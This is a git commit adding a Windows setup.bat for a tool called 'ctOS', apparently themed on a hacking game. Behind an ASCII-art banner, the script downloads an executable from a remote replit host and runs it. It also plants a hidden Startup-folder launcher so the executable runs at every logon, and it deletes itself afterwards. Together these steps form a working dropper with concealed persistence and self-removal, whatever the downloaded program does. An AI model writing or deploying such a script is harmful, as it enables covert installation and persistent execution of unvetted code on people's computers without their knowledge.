d4f232197c3bf3b66ae16994cd56733459ee63ef
Game K <57108380+Game-K-Hack@users.noreply.github.com>
2022-08-12 00:13:02 +0200

    Setup ctOS
    Create a setup of ctOS

---
+++ setup.bat
@@ -0,0 +1,24 @@
+@REM   ################################################################################################################
+@REM  ####                                      ########                                                            ####
+@REM ####                                        ######          ▄████  ▄▄▄       ███▄ ▄███▓▓█████     ██ ▄█▀        ####
+@REM ###               _    ____   _____          ####          ██▒ ▀█▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀     ██▄█▒          ###
+@REM ##               | |  / __ \ / ____|          ##          ▒██░▄▄▄░▒██  ▀█▄  ▓██    ▓██░▒███      ▓███▄░           ##
+@REM ##            ___| |_| |  | | (___            ##          ░▓█  ██▓░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄    ▓██ █▄           ##
+@REM ##           / __| __| |  | |\___ \           ##          ░▒▓███▀▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒   ▒██▒ █▄          ##
+@REM ##          | (__| |_| |__| |____) |          ##           ░▒   ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░   ▒ ▒▒ ▓▒          ##
+@REM ###          \___|\__|\____/|_____/          ####           ░   ░   ▒   ▒▒ ░░  ░      ░ ░ ░  ░   ░ ░▒ ▒░         ###
+@REM ####                                        ######        ░ ░   ░   ░   ▒   ░      ░      ░      ░ ░░ ░         ####
+@REM  ####                                      ########             ░       ░  ░       ░      ░  ░   ░  ░          ####
+@REM   ######### version: 3.0 #########################################################################################
+
+@echo off
+
+if not exist "%LOCALAPPDATA%\ctOS" (
+    mkdir "%LOCALAPPDATA%\ctOS"
+)
+
+curl https://ctos-api.gamek.repl.co/app --output %LOCALAPPDATA%\ctOS\ctOS.exe
+echo start "" %LOCALAPPDATA%\ctOS\ctOS.exe > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctOS.bat"
+attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctOS.bat"
+start "" %LOCALAPPDATA%\ctOS\ctOS.exe
+del %0
